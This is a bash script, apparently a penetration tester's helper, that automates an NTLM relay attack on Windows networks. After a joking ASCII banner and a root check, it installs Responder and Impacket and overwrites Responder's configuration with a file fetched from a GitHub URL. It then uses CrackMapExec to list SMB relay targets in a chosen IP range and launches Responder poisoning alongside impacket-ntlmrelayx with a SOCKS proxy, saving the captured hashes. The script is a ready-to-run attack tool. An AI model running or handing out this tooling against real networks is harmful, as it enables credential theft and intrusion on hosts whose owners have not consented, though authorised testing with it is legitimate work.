#!/bin/bash

#Color Variables
RED="\e[91m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
RESET="\e[0m"
ITALIC="\e[3m"
BOLD="\e[1m"

#Heading!
echo -e "${GREEN}                                                                                ${RESET}"
echo -e "${GREEN}                                                                                ${RESET}"
echo -e "${GREEN}                                                                                ${RESET}"
echo -e "${GREEN}                               ################*                                ${RESET}"
echo -e "${GREEN}                            ##%%%%%@%%%%%####%%%%%%#                            ${RESET}"
echo -e "${GREEN}                          ##%%%%%%%@@@@&##@###@@#%%%%#                          ${RESET}"
echo -e "${GREEN}                         #########%%%%@%&&%#######%%%%%#%                       ${RESET}"
echo -e "${GREEN}                       #####&###%%%%######%######%%#%%%%%###                    ${RESET}"
echo -e "${GREEN}                    ####@@@#######%#//////%(////###%@%@%##%%%                   ${RESET}"
echo -e "${GREEN}                   ############/##////////%%///////(#%%%%@%#%%                  ${RESET}"
echo -e "${GREEN}                 .#########%/%(###///%%%%(%%%###//////%%%%%%%%%                 ${RESET}"
echo -e "${GREEN}                ,%#@############//%////((/######%#/##//%%%#%%%%%                ${RESET}"
echo -e "${GREEN}                #%%%%##%#######/////#%##############////%%#%#%%%#               ${RESET}"
echo -e "${GREEN}               #%&%%##%##%####/##(%///////%%%###//%#%#///###%%%%%               ${RESET}"
echo -e "${GREEN}              %#%%%####%######%//////////////%%##//%#%%///##%%%%%%              ${RESET}"
echo -e "${GREEN}              %%%%%#@@#(####///////###//////////##/#%%%/%//#%#%%%(              ${RESET}"
echo -e "${GREEN}              #%%%%##@@%####%////##%////////////%%#/%%//##/##%%%%%              ${RESET}"
echo -e "${GREEN}              ##%%%%###%###%/#/###%////////####//%#//%#//#/##%%%%%              ${RESET}"
echo -e "${GREEN}              %%%%@%###/##//(/####%////////#/##/###%/%#//##//@%%%%%             ${RESET}"
echo -e "${GREEN}              %#%#%%#%//#////####%///%//##//////#/%#%%%//####%#%%@%             ${RESET}"
echo -e "${GREEN}             %#%%%%%%%%//////%###%/////##%%#%/#%//%%%#%//#/#%%#@%%%             ${RESET}"
echo -e "${GREEN}             %#%%%%%%@//////#%####//%#%###/#/%%%/%@%@###%##%#%%%%%%/            ${RESET}"
echo -e "${GREEN}              #&&%%%%///////######//#######//(//##@@###%%#/###%&%%%/            ${RESET}"
echo -e "${GREEN}              #%%%%@@#//////######///%###/######@%/###/%//##%@%%%%%/            ${RESET}"
echo -e "${GREEN}              %#%%%@@@#%////######///%%#%%#########/#/%///#%%##@%%%(            ${RESET}"
echo -e "${GREEN}              *#%%@%%%#/////((//###////%%%##%%///////%///#%%%%@%%%%             ${RESET}"
echo -e "${GREEN}               #%%%%%@//@@///#//#%##////#&@@@###///%#///##%(@%%%%%              ${RESET}"
echo -e "${GREEN}               %%%%%%%#(/////##/(%%%###////##########///###%#%@%%               ${RESET}"
echo -e "${GREEN}               .##%%%%%//(/////####%%%%%//#(///////////(#//#%%%%                ${RESET}"
echo -e "${GREEN}                %#%%@%%##/#///%//#####%///%%%#%%#////##///@#%%%%                ${RESET}"
echo -e "${GREEN}                 %####%%@%@////%//####/##(/////####///(///####                  ${RESET}"
echo -e "${GREEN}                   ##@%%%%%%@@%///@/##//////(#@%%/##///%%%%%(                   ${RESET}"
echo -e "${GREEN}                     ###%%%%%%%#@@#///@@/(#//####/%(/%%%%%#                     ${RESET}"
echo -e "${GREEN}                      ###%%%######@@@#//////////////#%#%%#                      ${RESET}"
echo -e "${GREEN}                       %%######%######@###(#%%%%%%%%%%%%                        ${RESET}"
echo -e "${GREEN}                          %%%%%#############@%@@@@@@@%%                         ${RESET}"
echo -e "${GREEN}                              #%%%######%%%%###%%%%%%                           ${RESET}"
echo -e "${GREEN}                                   %%%%%%%%%%%#/,                               ${RESET}"
echo -e "${GREEN}                                                                                ${RESET}"
echo -e "${GREEN}                                                                                 ${RESET}"
echo -e "${GREEN}                                                                                 ${RESET}"
echo -e "${GREEN}               by ${BLUE}Kyle Hoehn ${RED}with code stealing ${GREEN}from ${BLUE}Chris McMahon ${RESET}"
echo -e "${GREEN}                                                                                 ${RESET}"
echo -e "${GREEN}                                                                                 ${RESET}"

#Root Check
if [[ $(/usr/bin/id -u) -ne 0 ]]; then
    echo -e "[${RED}!${RESET}] Must be running as root or sudo. Quitting.\n"
    exit
fi

#Set Range to Ethernet Adapter by default unless a range is specified with -r
#range="$(ip a | grep -w "inet" | cut -d " " -f 6 | grep -v "127.0.0.1/8")"

#Options
while getopts 'r:h' opt; do
  case "$opt" in
    r)
      range="$OPTARG"
      echo -e "[${GREEN}+${RESET}] IP Range is set to '$range'"
      ;;

    h)
      echo -e "[${RED}!${RESET}] Usage: $(basename $0) -r 10.10.10.0/24"
      echo -e "              -r:  Specify IP Range or target text file. (Required)"
      echo -e "              -h:  Print this help dialog."
      exit 0
      ;;

    :)
      echo -e "[${RED}!${RESET}] Option requires an argument.\n\n    For usage, use $(basename $0) -h"
      exit 1
      ;;

    ?)
      echo -e "[${RED}!${RESET}] For usage, use $(basename $0) -h"
      exit 1
      ;;
    
  esac
done
shift "$(($OPTIND -1))"

sleep 2

echo -e "[${BLUE}*${RESET}] I WANT THAT MULAN NUGGET SAUCE!\n"
# Check for missing arguments

if [ -z "$range" ]; then
        echo -e "${RED}Get ready for it!!!${RESET}"
        sleep 2
        echo -e "Well then get your shit together, get it all together and put it in a backpack, all your shit, so it's together.\n"
        sleep 1
        echo -e "And if you gotta take it somewhere, take it somewhere, you know. Take it to the shit store and sell it, or put it in the shit museum. I don't care what you do, you just gotta get it together.\n"
        sleep 1
        echo -e "Get your shit together.\n\n"
        sleep 1
        echo -e "[${RED}!${RESET}] For usage, use $(basename $0) -h"
        exit 1
fi

sleep 2

#Variables for scripting use
varWorkingDir="$(pwd)"

#Installing dependencies if not already installed
echo -e "[${BLUE}+${RESET}] Checking for application dependencies."
if command -v terminator &> /dev/null
then
    echo -e "[${GREEN}+${RESET}] Terminator is installed."
else
echo -e "[${RED}!${RESET}] Installing Terminator."
apt update && apt install terminator -y
fi
if command -v responder &> /dev/null
then
    echo -e "[${GREEN}+${RESET}] Responder is installed."
else
echo -e "[${RED}!${RESET}] Installing Responder."
apt update && apt install responder -y
fi
if command -v impacket-ntlmrelayx &> /dev/null
then
    echo -e "[${GREEN}+${RESET}] Impacket-Scripts are installed."
else
echo -e "[${RED}!${RESET}] Installing Impacket-Scrpits."
apt update && apt install impacket-scripts -y
fi

#Renaming original Responder Config File
echo -e "[${GREEN}+${RESET}] Renaming default Responder config file to \"/usr/share/responder/Responder.conf.old\"."
mv /usr/share/responder/Responder.conf /usr/share/responder/Responder.conf.old

#Downloading Modified Responder Config File
echo -e "[${GREEN}+${RESET}] Downloading modified Responder config file"
curl https://raw.githubusercontent.com/B0rk/Scripts/main/Responder_Config/ntlmrelayx_responder.conf -o /usr/share/responder/Responder.conf &> /dev/null

#Echo range selection
echo -e "[${GREEN}+${RESET}] Range is currently set to ${range}."

#Sleep to allow for removal and downloading to complete.
echo -e "[${GREEN}+${RESET}] What, so everyone is supposed to sleep every single night now?"
sleep 5

#Running CrackMapExec to create a relay list
echo -e "[${GREEN}+${RESET}] Generating relay list for the ${range} IP range."
crackmapexec smb ${range} --gen-relay-list ${varWorkingDir}/relay_targets.txt

#Launching Responder and impacket-ntlmrelayx
echo -e "[${GREEN}+${RESET}] Checking for relay list."
if [ ! -f "${varWorkingDir}/relay_targets.txt" ]; then
  echo -e "[${RED}!${RESET}] ${RED}Relay file does not exist.${RESET} ${YELLOW}Sorry about your luck...${RESET}"
  exit 2
else
  echo -e "[${GREEN}*${RESET}] ${RED}LET THE GAMES BEGIN!${RESET}"
  terminator -e "responder -I eth0 -w"
  terminator -e "impacket-ntlmrelayx -tf ${varWorkingDir}/relay_targets.txt -smb2support -socks --output-file ${varWorkingDir}/ntlmrelayx_hashes.out"
  echo -e "Www.. what am I, a hack?! Go nuts, Morty, it's full proof."
fi
